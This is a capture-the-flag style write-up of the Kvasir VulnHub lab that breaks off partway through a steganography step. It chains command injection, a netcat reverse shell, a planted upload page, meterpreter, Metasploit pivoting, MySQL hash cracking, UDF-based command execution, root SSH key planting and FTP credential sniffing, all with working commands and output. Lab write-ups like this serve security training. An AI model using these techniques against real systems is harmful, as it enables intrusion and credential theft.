---
layout: post
title: "Kvasir VM writeup"
date: 2014-11-05 19:30:38 +1100
comments: true
categories: [vulnhub, boot2root, forensics, pivoting, metasploit, key reuse, crypto, stego, command injection, sql]
---

It sort of became the main theme of this blog... yet another writeup for a VM from [VulnHub](http://vulnhub.com) and, I have to admit, probably the most demanding one yet!

[Kvasir](http://vulnhub.com/entry/kvasir-i,106/) touches on quite a lot of aspects of security/pentesting and really tests your patience. [Rasta Mouse](https://twitter.com/_RastaMouse) did a great job putting it all together and simulating a network of quite some depth by using Linux containers.

So, without delying too much, let's get right into it as there's A LOT to go through!

<!-- more -->


Preface
-------

Since it's quite lengthy VM, I'll skip describing thousands of failed attempts and other ideas that I had and thought *should have* worked.

Instead, I will jump straight to the essence, but, in some cases, I'll mention what is also worth trying if you find yourself in similar situations (but didn't work with this challenge).


Recon
-----

You know the drill, boot up the VM, wait a little bit for containers to kick-in and use ```netdiscover``` to find its IP address.

```
root@kali:~# netdiscover -r 172.16.246.0/24

 Currently scanning: Finished!   |   Screen View: Unique Hosts                 
                                                                               
 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180               
 _____________________________________________________________________________
   IP            At MAC Address      Count  Len   MAC Vendor                   
 ----------------------------------------------------------------------------- 
 172.16.246.1    00:50:56:c0:00:01    01    060   VMWare, Inc.                 
 172.16.246.134  00:0c:29:a8:5e:9e    01    060   VMware, Inc.                 
 172.16.246.254  00:50:56:f1:3e:b4    01    060   VMWare, Inc.                 
```

And ```nmap``` to find what ports are open.

```
root@kali:~# nmap -sV 172.16.246.134

Starting Nmap 6.47 ( http://nmap.org ) at 2014-11-05 19:42 EST
Nmap scan report for 172.16.246.134
Host is up (0.00032s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.2.22 ((Debian))
MAC Address: 00:0C:29:A8:5E:9E (VMware)

Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.24 seconds
```


No redirect and command injection
---------------------------------

Let's have a look at that webserver.

![Login](/images/posts/2014-11-05-kvasir-vm-writeup/login.png "Login")

We have a simple login form, first thing I usually try is bypassing this with some standard SQL injection ```' or '1'='1' --``` in both login and password fields. Unfortunately this didn't work here.

Let's create a new user and see what else can we access.

![Welcome](/images/posts/2014-11-05-kvasir-vm-writeup/welcome.png "Welcome")

Hmm, not much of a useful stuff. Generally, you would want to keep an eye on and play with:

* cookies
* XXS - not very useful here as there are no users to attack
* SQL injection on any of the input fields / URL parameters

But none of the above worked. So let's open up ```dirbuster``` and see are there any other pages that we can't access at the moment...

```
root@kali:~# dirbuster
Starting OWASP DirBuster 1.0-RC1
Starting dir/file list based brute forcing
File found: /index.php - 200
Dir found: / - 200
Dir found: /cgi-bin/ - 403
File found: /login.php - 302
File found: /register.php - 200
File found: /submit.php - 200
File found: /admin.php - 302
File found: /member.php - 302
...
```

Straight away ```admin.php``` stands out - looks interesting... and when trying to access it, we get a redirect to member.php! Cool, let's use ```burp``` and avoid redirection.

I'm using ```FoxyProxy``` to ensure my browser is using proxy I specify (in this case, ```burp```). Set it up and type in ```http://172.16.246.134/admin.php``` in the address bar.

Go to Proxy -> Intercept and Burp and set it to intercept response.

![Intercept Response](/images/posts/2014-11-05-kvasir-vm-writeup/intercept_response.png "Intercept Response")

Forward the request and you'll see the response.

![Response](/images/posts/2014-11-05-kvasir-vm-writeup/response.png "Response")

Let's modify the header from ```HTTP/1.1 302 FOUND``` to ```HTTP/1.1 200``` (bypassing redirection) and forward the packet. Look what we can see in the browser now!

![Service Check](/images/posts/2014-11-05-kvasir-vm-writeup/service_check.png "Service Check")

Awesome! Let's type in what's suggested - apache2 and see what happens. Since we still have ```burp``` running, we'll go through the same steps of modifying the request and response as above, otherwise, we'll be redirected back to ```member.php``` page.

![Apache Running](/images/posts/2014-11-05-kvasir-vm-writeup/apache_running.png "Apache Running")

It's just asking for command injection! But since doing it all through ```burp``` would be a bit of a pain, I've crafted a simple script to do it all for me.

{% codeblock lang:perl %}
#!/usr/bin/perl

$url='http://172.16.246.134/admin.php';

use LWP;
use HTTP::Request::Common;
$ua = $ua = LWP::UserAgent->new;;
$res = $ua->request(POST $url,
Content_Type => 'form-data',

Content => [
service => $ARGV[0],
submit => "Submit",
],);

# Print response
print $res->as_string();
{% endcodeblock %}

Now I can pass in whatever I want to send through the ```admin.php``` page as a command line argument to the script.

Initially I tried ```./send_form.pl "apache2; id"```, but it didn't work, let's try a variation of it with ```#``` at the end.

{% codeblock %}
root@kali:~# ./send_form.pl "apache2; id #"
HTTP/1.1 302 Found
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Connection: close
Date: Tue, 04 Nov 2014 19:46:00 GMT
Pragma: no-cache
Location: index.php
Server: Apache/2.2.22 (Debian)
Vary: Accept-Encoding
Content-Length: 546
Content-Type: text/html
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Client-Date: Wed, 05 Nov 2014 09:40:50 GMT
Client-Peer: 172.16.246.134:80
Client-Response-Num: 1
Set-Cookie: PHPSESSID=vsur3uar3fopv27r8rtfk5dmd2; path=/
X-Powered-By: PHP/5.4.4-14+deb7u11


<html>
<body>
<div align="center">

<h1>Service Check</h1>

<form name="service" method="post" action="">
<input name="service" id="service" type="text" placeholder="apache2" /><br /><br />
<input name="submit" id="submit" type="submit" value="Submit" />
</form>

<form action="logout.php" method="post">
<input type="submit" value="Logout" />
</form>

<pre>Usage: /etc/init.d/apache2 {start|stop|graceful-stop|restart|reload|force-reload|start-htcacheclean|stop-htcacheclean|status}.
uid=33(www-data) gid=33(www-data) groups=33(www-data)
</pre>
{% endcodeblock %}

Awesome, confirmed command injection! Conviniently, there's ```netcat``` available as well, so let's take advantage of it!

Set up listener locally.

```
root@kali:~# nc -l -p 31337
```

And use the command injection vulnerability to connect back with a shell.

```
root@kali:~# ./send_form.pl "apache2; netcat -e /bin/bash 172.16.246.129 31337"
```

```
root@kali:~# nc -l -p 31337
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Woohoo, we're in!


MySQL and enabling UDF
----------------------

Doing a bit of a recon on the box, we can quickly find out by looking at the ```submit.php``` file that there's a MySQL database listening on 192.168.2.200 with credentials ```webapp:webapp```.

Okay, looks like this host is dual-homed! We'll need to jump on 192.168.2.0 subnet (and eventually, further). Also, we have non-TTY shell, so it's a bit of a pain...

To overcome this, I came up with an idea to use ```metasploit``` pivoting capability, SOCKS proxy server and ```proxychains``` to connect to MySQL database directly from my host.

First, I need to generate and get metasploit payload on the server, but how? I came up with another idea... but thinking about it now, there are probably number of other, better and easier methods. Oh well, that's the first one I went ahead with, so I'll stick to it with this writeup.

I'll create a new php upload page and get my files on that server this way!

```
echo "<html><head></head><body><form action=upload.php method=post enctype=multipart/form-data><input type=file name=uploadFile><br><input type=submit value=Upload File></form>" > upload.php
echo "<?php" >> upload.php
echo "\$target_dir = \"uploads/\";" >> upload.php
echo "\$target_dir = \$target_dir . basename( \$_FILES[\"uploadFile\"][\"name\"]);" >> upload.php
echo "if (move_uploaded_file(\$_FILES[\"uploadFile\"][\"tmp_name\"], \$target_dir)) {" >> upload.php
echo "echo \"The file \". basename( \$_FILES[\"uploadFile\"][\"name\"]). \" has been uploaded.\";" >> upload.php
echo "} else {" >> upload.php
echo "echo \"Sorry, there was an error uploading your file.\";" >> upload.php
echo "}?></body></html>" >> upload.php
```

![Upload](/images/posts/2014-11-05-kvasir-vm-writeup/upload.png "Upload")

Generate metasploit payload and upload it to the server using newly created page.

```
msf > use payload/linux/x86/meterpreter/reverse_tcp 
msf payload(reverse_tcp) > show options

Module options (payload/linux/x86/meterpreter/reverse_tcp):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   DebugOptions  0                no        Debugging options for POSIX meterpreter
   LHOST                          yes       The listen address
   LPORT         4444             yes       The listen port

msf payload(reverse_tcp) > set LHOST 172.16.246.129
LHOST => 172.16.246.129
msf payload(reverse_tcp) > generate -t elf -f exploit
[*] Writing 155 bytes to exploit...
```

Set-up metasploit multi handler and run the exploit.

```
msf > use exploit/multi/handler 
msf exploit(handler) > set PAYLOAD linux/x86/meterpreter/reverse_tcp 
PAYLOAD => linux/x86/meterpreter/reverse_tcp
msf exploit(handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (linux/x86/meterpreter/reverse_tcp):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   DebugOptions  0                no        Debugging options for POSIX meterpreter
   LHOST         172.16.246.129   yes       The listen address
   LPORT         4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf exploit(handler) > exploit -j
[*] Exploit running as background job.

[*] Started reverse handler on 172.16.246.129:4444 
[*] Starting the payload handler...
```

```
root@kali:~# nc -l -p 31337
ls
admin.php
index.php
login.php
logout.php
member.php
register.php
submit.php
upload.php
uploads


cd uploads
./exploit &
```

```
msf exploit(handler) > [*] Transmitting intermediate stager for over-sized stage...(100 bytes)
[*] Sending stage (1138688 bytes) to 172.16.246.134
[*] Meterpreter session 5 opened (172.16.246.129:4444 -> 172.16.246.134:55877) at 2014-11-05 21:24:03 +1100
```

Woop, woop, we got meterpreter shell! [Meterpreter dance](http://i.imgur.com/hV9YDNn.gif)

Let's configure a pivot and start socks server in metasploit and configure proxychains.

```
msf exploit(handler) > route add 192.168.2.0 255.255.255.0 5
[*] Route added
msf exploit(handler) > route print

Active Routing Table
====================

   Subnet             Netmask            Gateway
   ------             -------            -------
   192.168.2.0        255.255.255.0      Session 5

msf exploit(handler) > back
msf > use auxiliary/server/socks
use auxiliary/server/socks4a    use auxiliary/server/socks_unc
msf > use auxiliary/server/socks4a 
msf auxiliary(socks4a) > show options

Module options (auxiliary/server/socks4a):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The address to listen on
   SRVPORT  1080             yes       The port to listen on.

msf auxiliary(socks4a) > run
[*] Auxiliary module execution completed

[*] Starting the socks4a proxy server
[*] Stopping the socks4a proxy server
msf auxiliary(socks4a) > jobs
```

Make sure to add the following lines in ```/etc/proxychains.conf```

```
# MetaSploit
socks4 127.0.0.1 1080
```

Now we can run any command on our local Kali with ```proxychains``` in front of it and it'll talk directly to anything on 192.168.2.0 subnet!

Let's connect to the MySQL server and loot as much as we can.

```
root@kali:~# proxychains mysql -h 192.168.2.200 -u webapp -p
ProxyChains-3.1 (http://proxychains.sf.net)
Enter password: 
|S-chain|-<>-127.0.0.1:1080-<><>-192.168.2.200:3306-<><>-OK
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 67
Server version: 5.5.37-0+wheezy1 (Debian)

Copyright (c) 2000, 2014, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| webapp             |
+--------------------+
4 rows in set (0.09 sec)

mysql> use mysql;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+---------------------------+
| Tables_in_mysql           |
+---------------------------+
| columns_priv              |
| db                        |
| event                     |
| func                      |
| general_log               |
| help_category             |
| help_keyword              |
| help_relation             |
| help_topic                |
| host                      |
| ndb_binlog_index          |
| plugin                    |
| proc                      |
| procs_priv                |
| proxies_priv              |
| servers                   |
| slow_log                  |
| tables_priv               |
| time_zone                 |
| time_zone_leap_second     |
| time_zone_name            |
| time_zone_transition      |
| time_zone_transition_type |
| user                      |
+---------------------------+
24 rows in set (0.01 sec)

mysql> select User, Password from user;
+------------------+-------------------------------------------+
| User             | Password                                  |
+------------------+-------------------------------------------+
| root             | *ECB01D78C2FBEE997EDA584C647183FD99C115FD |
| root             | *ECB01D78C2FBEE997EDA584C647183FD99C115FD |
| root             | *ECB01D78C2FBEE997EDA584C647183FD99C115FD |
| root             | *ECB01D78C2FBEE997EDA584C647183FD99C115FD |
| debian-sys-maint | *E0E0871376896664A590151D348CCE9AA800435B |
| webapp           | *BF7C27E734F86F28A9386E9759D238AFB863BDE3 |
| root             | *ECB01D78C2FBEE997EDA584C647183FD99C115FD |
+------------------+-------------------------------------------+
7 rows in set (0.01 sec)

mysql> use webapp;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+------------------+
| Tables_in_webapp |
+------------------+
| todo             |
| users            |
+------------------+
2 rows in set (0.06 sec)

mysql> select * from todo;
+----------------------------+
| task                       |
+----------------------------+
| stop running mysql as root |
+----------------------------+
1 row in set (0.04 sec)
```

Some useful piece of information. We have database running as root user on the server and we looted root password to the database that we cracked via [CrackStation](https://crackstation.net/).

![CrackStation](/images/posts/2014-11-05-kvasir-vm-writeup/crackstation.png "Crack Station")

Let's log-in with ```root:coolwater``` and see how we can break out to system shell.

```
root@kali:~# proxychains mysql -h 192.168.2.200 -u root -p
ProxyChains-3.1 (http://proxychains.sf.net)
Enter password: 
|S-chain|-<>-127.0.0.1:1080-<><>-192.168.2.200:3306-<><>-OK
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 68
Server version: 5.5.37-0+wheezy1 (Debian)

Copyright (c) 2000, 2014, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> use webapp
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
```

There are couple cool things that we can do:

* reading any file on the system

```
mysql> create table pwn(test text);
Query OK, 0 rows affected (0.04 sec)

mysql> load data infile '/etc/passwd' into table pwn;
Query OK, 22 rows affected (0.01 sec)
Records: 22  Deleted: 0  Skipped: 0  Warnings: 0

mysql> select * from pwn;
+-------------------------------------------------------------------------+
| test                                                                    |
+-------------------------------------------------------------------------+
| root:x:0:0:root:/root:/bin/bash                                         |
| daemon:x:1:1:daemon:/usr/sbin:/bin/sh                                   |
| bin:x:2:2:bin:/bin:/bin/sh                                              |
| sys:x:3:3:sys:/dev:/bin/sh                                              |
| sync:x:4:65534:sync:/bin:/bin/sync                                      |
| games:x:5:60:games:/usr/games:/bin/sh                                   |
| man:x:6:12:man:/var/cache/man:/bin/sh                                   |
| lp:x:7:7:lp:/var/spool/lpd:/bin/sh                                      |
| mail:x:8:8:mail:/var/mail:/bin/sh                                       |
| news:x:9:9:news:/var/spool/news:/bin/sh                                 |
| uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh                               |
| proxy:x:13:13:proxy:/bin:/bin/sh                                        |
| www-data:x:33:33:www-data:/var/www:/bin/sh                              |
| backup:x:34:34:backup:/var/backups:/bin/sh                              |
| list:x:38:38:Mailing List Manager:/var/list:/bin/sh                     |
| irc:x:39:39:ircd:/var/run/ircd:/bin/sh                                  |
| gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh |
| nobody:x:65534:65534:nobody:/nonexistent:/bin/sh                        |
| libuuid:x:100:101::/var/lib/libuuid:/bin/sh                             |
| sshd:x:101:65534::/var/run/sshd:/usr/sbin/nologin                       |
| mysql:x:102:103:MySQL Server,,,:/nonexistent:/bin/false                 |
| ftpuser:x:1000:1000::/dev/null:/etc/                                    |
+-------------------------------------------------------------------------+
22 rows in set (0.02 sec)

```

* create a file on the system (as long as it doesn't exist yet, you can't modify/write to existing files)

```
mysql> insert into pwn(test) values("here is some text");
Query OK, 1 row affected (0.07 sec)

mysql> select * from pwn into dumpfile '/tmp/pwn';
Query OK, 0 rows affected (0.10 sec)
```

However, this doesn't give us much, no interesting files to read and I tried creating SSH keys, however, MySQL sets permissions of files it creates to 660, which is not restrictive enough for SSH keys to work.

Last resort - UDF functions! But... there's a problem, it's not installed! But that's OK, there's a trick to install it ourselves.

Couple things we'll need to do:

* define base64 decoding functions (we need to somehow get actual libraries over onto the server)

```
-- base64.sql - MySQL base64 encoding/decoding functions
-- Copyright (C) 2006 Ian Gulliver
-- 
-- This program is free software; you can redistribute it and/or modify
-- it under the terms of version 2 of the GNU General Public License as
-- published by the Free Software Foundation.
-- 
-- This program is distributed in the hope that it will be useful,
-- but WITHOUT ANY WARRANTY; without even the implied warranty of
-- MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
-- GNU General Public License for more details.
-- 
-- You should have received a copy of the GNU General Public License
-- along with this program; if not, write to the Free Software
-- Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307 USA

delimiter |

DROP TABLE IF EXISTS base64_data |
CREATE TABLE base64_data (c CHAR(1) BINARY, val TINYINT) |
INSERT INTO base64_data VALUES 
('A',0), ('B',1), ('C',2), ('D',3), ('E',4), ('F',5), ('G',6), ('H',7), ('I',8), ('J',9),
('K',10), ('L',11), ('M',12), ('N',13), ('O',14), ('P',15), ('Q',16), ('R',17), ('S',18), ('T',19),
('U',20), ('V',21), ('W',22), ('X',23), ('Y',24), ('Z',25), ('a',26), ('b',27), ('c',28), ('d',29),
('e',30), ('f',31), ('g',32), ('h',33), ('i',34), ('j',35), ('k',36), ('l',37), ('m',38), ('n',39),
('o',40), ('p',41), ('q',42), ('r',43), ('s',44), ('t',45), ('u',46), ('v',47), ('w',48), ('x',49),
('y',50), ('z',51), ('0',52), ('1',53), ('2',54), ('3',55), ('4',56), ('5',57), ('6',58), ('7',59),
('8',60), ('9',61), ('+',62), ('/',63), ('=',0) |


DROP FUNCTION IF EXISTS BASE64_DECODE |
CREATE FUNCTION BASE64_DECODE (input BLOB)
RETURNS BLOB
CONTAINS SQL
DETERMINISTIC
SQL SECURITY INVOKER
BEGIN
DECLARE ret BLOB DEFAULT '';
DECLARE done TINYINT DEFAULT 0;

IF input IS NULL THEN
RETURN NULL;
END IF;

each_block:
WHILE NOT done DO BEGIN
DECLARE accum_value BIGINT UNSIGNED DEFAULT 0;
DECLARE in_count TINYINT DEFAULT 0;
DECLARE out_count TINYINT DEFAULT 3;

each_input_char:
WHILE in_count < 4 DO BEGIN
DECLARE first_char CHAR(1);

IF LENGTH(input) = 0 THEN
RETURN ret;
END IF;

SET first_char = SUBSTRING(input,1,1);
SET input = SUBSTRING(input,2);

BEGIN
DECLARE tempval TINYINT UNSIGNED;
DECLARE error TINYINT DEFAULT 0;
DECLARE base64_getval CURSOR FOR SELECT val FROM base64_data WHERE c = first_char;
DECLARE CONTINUE HANDLER FOR SQLSTATE '02000' SET error = 1;

OPEN base64_getval;
FETCH base64_getval INTO tempval;
CLOSE base64_getval;

IF error THEN
ITERATE each_input_char;
END IF;

SET accum_value = (accum_value << 6) + tempval;
END;

SET in_count = in_count + 1;

IF first_char = '=' THEN
SET done = 1;
SET out_count = out_count - 1;
END IF;
END; END WHILE;

-- We've now accumulated 24 bits; deaccumulate into bytes

-- We have to work from the left, so use the third byte position and shift left
WHILE out_count > 0 DO BEGIN
SET ret = CONCAT(ret,CHAR((accum_value & 0xff0000) >> 16));
SET out_count = out_count - 1;
SET accum_value = (accum_value << 8) & 0xffffff;
END; END WHILE;

END; END WHILE;

RETURN ret;
END |

DROP FUNCTION IF EXISTS BASE64_ENCODE |
CREATE FUNCTION BASE64_ENCODE (input BLOB)
RETURNS BLOB
CONTAINS SQL
DETERMINISTIC
SQL SECURITY INVOKER
BEGIN
DECLARE ret BLOB DEFAULT '';
DECLARE done TINYINT DEFAULT 0;

IF input IS NULL THEN
RETURN NULL;
END IF;

each_block:
WHILE NOT done DO BEGIN
DECLARE accum_value BIGINT UNSIGNED DEFAULT 0;
DECLARE in_count TINYINT DEFAULT 0;
DECLARE out_count TINYINT;

each_input_char:
WHILE in_count < 3 DO BEGIN
DECLARE first_char CHAR(1);

IF LENGTH(input) = 0 THEN
SET done = 1;
SET accum_value = accum_value << (8 * (3 - in_count));
LEAVE each_input_char;
END IF;

SET first_char = SUBSTRING(input,1,1);
SET input = SUBSTRING(input,2);

SET accum_value = (accum_value << 8) + ASCII(first_char);

SET in_count = in_count + 1;
END; END WHILE;

-- We've now accumulated 24 bits; deaccumulate into base64 characters

-- We have to work from the left, so use the third byte position and shift left
CASE
WHEN in_count = 3 THEN SET out_count = 4;
WHEN in_count = 2 THEN SET out_count = 3;
WHEN in_count = 1 THEN SET out_count = 2;
ELSE RETURN ret;
END CASE;

WHILE out_count > 0 DO BEGIN
BEGIN
DECLARE out_char CHAR(1);
DECLARE base64_getval CURSOR FOR SELECT c FROM base64_data WHERE val = (accum_value >> 18);

OPEN base64_getval;
FETCH base64_getval INTO out_char;
CLOSE base64_getval;

SET ret = CONCAT(ret,out_char);
SET out_count = out_count - 1;
SET accum_value = accum_value << 6 & 0xffffff;
END;
END; END WHILE;

CASE
WHEN in_count = 2 THEN SET ret = CONCAT(ret,'=');
WHEN in_count = 1 THEN SET ret = CONCAT(ret,'==');
ELSE BEGIN END;
END CASE;

END; END WHILE;

RETURN ret;
END |
```

* Download 64 bit version of the [UDF library](https://github.com/sqlmapproject/sqlmap/tree/master/udf/mysql/linux) and run ```base64``` through it (32 bit version returns: 'wrong ELF class: ELFCLASS32').

* Insert base64 value into the table

```
mysql> insert into pwn(test) values ("f0VMRgEBAQAAAAAAAAAAAAMAAwABAAAAwAgAADQAAACoJAAAA (...)");
```

* generate binary

```
mysql> select base64_decode(test) from pentest into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys.so';
```

* add the following functions

```
DROP FUNCTION IF EXISTS lib_mysqludf_sys_info;
DROP FUNCTION IF EXISTS sys_get;
DROP FUNCTION IF EXISTS sys_set;
DROP FUNCTION IF EXISTS sys_exec;
DROP FUNCTION IF EXISTS sys_eval;

CREATE FUNCTION lib_mysqludf_sys_info RETURNS string SONAME 'lib_mysqludf_sys.so';
CREATE FUNCTION sys_get RETURNS string SONAME 'lib_mysqludf_sys.so';
CREATE FUNCTION sys_set RETURNS int SONAME 'lib_mysqludf_sys.so';
CREATE FUNCTION sys_exec RETURNS int SONAME 'lib_mysqludf_sys.so';
CREATE FUNCTION sys_eval RETURNS string SONAME 'lib_mysqludf_sys.so';
```

*We really only need sys_eval*

* generate keys on Kali and add public key to ```/root/.ssh/authorized_keys``` on the database server:

```
mysql> select sys_eval('echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqtaI+mJb7hYALi8qoSXi8wntkC4QuNyFNWLfDzNC1GxeU+pZHz9BCTqFKwzqYLC3Z4CcD3y8I7KsCrBEgFVJaW9OWCoZHeiSnoDOorv/9C8uk7CRZ1jM9AVE7fsuL6rOUHuEFbSgCDLnbo5SFntQSX7UqHDOnn6glhVf+zn58tYf8wMSdH+Is/oAVrJ0G7h7fKNvbIDkVysiBZeZQrMZ3KG5CVq/FzgnSg+WD14YsRVtlcI1irfAdR3MCl4SgGXohAOEvX6mrcMcbe8lvxGRzcJ/T6fe/dHmZUdhZll3ABSHRLYERFqXOtH7veGeZD/PyLXEDzvW0iJUPape2EYrB root@kali" > /root/.ssh/authorized_keys');
```

* set right permissions

```
mysql> select sys_eval('chmod 600 /root/.ssh/authorized_keys');
```

And now we should be able to SSH in as root.

```
root@kali:~# proxychains ssh root@192.168.2.200
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:1080-<><>-192.168.2.200:22-<><>-OK
Linux db 3.2.0-4-amd64 #1 SMP Debian 3.2.60-1+deb7u3 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Nov  4 20:26:44 2014 from 192.168.2.100
root@db:~#
```

Woooooo! That's not the final root though...

```
root@db:~# cat flag 
This is not the flag you're looking for... :p
```

FTP? Sniff! Sniff!
------------------

After a bit of poking around, we can get some potentially useful information - some dictionary...

```
root@db:~# head .words.txt 
borne
precombatting
noncandescent
cushat
lushness

(...truncated...)
```

Hostnames and IP addresses...

```
root@db:~# cat /etc/hosts
# 192.168.3.40  celes
# 192.168.3.50  terra

127.0.0.1   localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0     ip6-localnet
ff00::0     ip6-mcastprefix
ff02::1     ip6-allnodes
ff02::2     ip6-allrouters
```

Find out that it's dual homed... again!

```
root@db:~# ifconfig
eth0      Link encap:Ethernet  HWaddr fe:57:f7:0e:e1:98  
          inet addr:192.168.2.200  Bcast:192.168.2.255  Mask:255.255.255.0
          inet6 addr: fe80::fc57:f7ff:fe0e:e198/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:69773 errors:0 dropped:0 overruns:0 frame:0
          TX packets:55386 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:5835676 (5.5 MiB)  TX bytes:9220761 (8.7 MiB)

eth1      Link encap:Ethernet  HWaddr 86:b5:59:44:80:fb  
          inet addr:192.168.3.200  Bcast:192.168.3.255  Mask:255.255.255.0
          inet6 addr: fe80::84b5:59ff:fe44:80fb/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:106899 errors:0 dropped:0 overruns:0 frame:0
          TX packets:91488 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:15188636 (14.4 MiB)  TX bytes:8176191 (7.7 MiB)

(...)
```

And we can also see that there's FTP service enabled.

```
root@db:~# netstat -ant
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 192.168.2.200:3306      0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:21              0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0      0 192.168.2.200:22        192.168.2.100:43133     ESTABLISHED
tcp        0      0 192.168.3.200:21214     192.168.3.40:45888      TIME_WAIT  
tcp        0      0 192.168.3.200:58695     192.168.3.50:22         ESTABLISHED
tcp        0    320 192.168.2.200:22        192.168.2.100:43595     ESTABLISHED
tcp6       0      0 :::21                   :::*                    LISTEN     
tcp6       0      0 :::22                   :::*                    LISTEN     

(...some more poking around...)

root@db:~# cat /etc/pure-ftpd/pureftpd.passwd 
celes:$1$LwZNkFH0$8rq4AbiYLXkfSMPXB1psV/:1000:1000::/var/log/./::::::::::::
```

Unfortunately I didn't seem to be able to crack this password using a dictionary. That got me stuck a bit.
Sometimes you need to take a step back and ask yourself a question "what's insecure about... FTP?". Of course! It's plaintext!

Let's assume (and hope) there are 'users' on the system, so let's try to sniff some traffic!

```
root@db:~# tcpdump -i eth1 -vv -x 'port 21' -w ftp-sniff.pcap
tcpdump: listening on eth1, link-type EN10MB (Ethernet), capture size 65535 bytes
^C21 packets captured
21 packets received by filter
0 packets dropped by kernel
```

Woohoo, there are some packets! Further investigation into them reveals the following username:password combination ```celes:im22BF4HXn01```.


Stego
-----

Let's hope celes is a user of very average security awarness and reuses his passwords everywhere... let's try to SSH using these credentials.

```
root@db:~# ssh celes@192.168.3.40
celes@192.168.3.40's password: 
Linux dev1 3.2.0-4-amd64 #1 SMP Debian 3.2.60-1+deb7u3 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have mail.
Last login: Fri Oct 24 10:35:02 2014 from 192.168.3.200
celes@dev1:~$ 
```

And we're in. A bit of poking around and can't see anything really interesting except an image file ```kvasir.png```. Let's download it (```scp``` all the way back) and see what can we get out of it.

![Kvasir](/images/posts/2014-11-05-kvasir-vm-writeup/kvasir.png "Kvasir")

Also ```strings``` didn't reveal anything interesting about the file. But looking at ```.bash_history``` on celes, we can see a clue.

```
celes@dev1:~$ cat .bash_history 
stepic --help
```

Aha, must be some kind of stego! I have quickly downloaded ```stepic``` and run on ```kvasir.png```.

```
root@kali:~/data/scripts/stepic-0.3# ./stepic -d -i ~/data/boot2root/kvasir/kvasir.png 
89504e470d0a1a0a0000000d494844520000012200000122010300000067704df500000006504c5445ffffff00000055c2d37e00000104494441540899ed98c90dc32010459152804b72eb2ec9054422304bc089655f180ec9fb0730f07cfa9a0552420821f43fcaa6674aeb5e96dbe23b1b5434a58be559bf1e59befa03a848aa5ab22de690f2d530a8895473086a365500e7a1265132b5b3bbfc05358e7a57640b919bba0d358eeab55c9c418da7cc0df1a576a2792fa561ad035434a5920b808588d974e215d4584acff4065626ffe9db47a8e194eec805a00d7621830aa6acffd40c95d5a6fa27d404cae555e13475410550e6cca113ed72145424a56ee8ab4f8989ecb5196a02d5bdfa2477e83333410553d97ba093cc04154c89a439ba880ea881944c2d3aea0a6a0e75acc8528c4550e1144208a15fd70b88df9bb4ae0a3dc20000000049454e44ae426082
```

Hmm, alright... that looks like some hex output... let's run it through ```xxd```

```
